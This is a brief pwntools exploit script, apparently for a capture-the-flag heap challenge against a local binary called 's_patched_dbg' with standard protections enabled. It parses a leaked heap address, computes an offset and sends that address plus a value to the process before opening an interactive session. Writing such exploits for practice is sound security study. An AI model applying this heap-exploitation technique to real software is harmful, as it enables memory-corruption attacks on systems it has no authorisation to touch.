#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template s
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 's_patched_dbg')
context.terminal = ["terminator", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()


heap_d = int(io.recvline().strip(),16)
log.info(f"heap_d: {hex(heap_d)}")
heap_c = heap_d - 80
log.info(f"heap_c: {hex(heap_c)}")
heap_c_8 = heap_c + 8
heap_c_16 = heap_c - 16

io.sendline(f"{heap_c}".encode())
io.sendline("100".encode())

io.interactive()


